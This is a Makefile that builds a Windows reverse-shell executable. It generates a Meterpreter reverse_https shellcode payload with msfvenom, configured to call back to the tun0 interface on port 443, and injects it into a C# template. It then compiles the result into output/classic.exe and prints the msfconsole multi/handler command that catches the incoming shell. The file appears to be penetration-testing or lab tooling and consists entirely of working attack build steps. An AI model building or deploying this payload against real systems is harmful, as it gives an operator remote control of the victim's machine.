PAYLOAD := windows/x64/meterpreter/reverse_https
LHOST := tun0
LPORT := 443
ccyellow= \e[0;33m
ccend= \e[0m
LISTENER_CMD := "\n$(ccyellow)to start the listener run:\nmsfconsole -q -x \"use multi/handler;set payload $(PAYLOAD);set lhost $(LHOST); set lport $(LPORT); exploit\"$(ccend)"

all: classic

sources:
	mkdir sources

output:
	mkdir output

classic.cs: sources templates/classic.cs
	export PAYLOAD=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f csharp); \
	cat templates/classic.cs | envsubst > sources/classic.cs

classic: output classic.cs
	mcs -out:output/classic.exe sources/classic.cs
	@echo $(LISTENER_CMD)

clean:
	rm -rf \
		sources \
		output
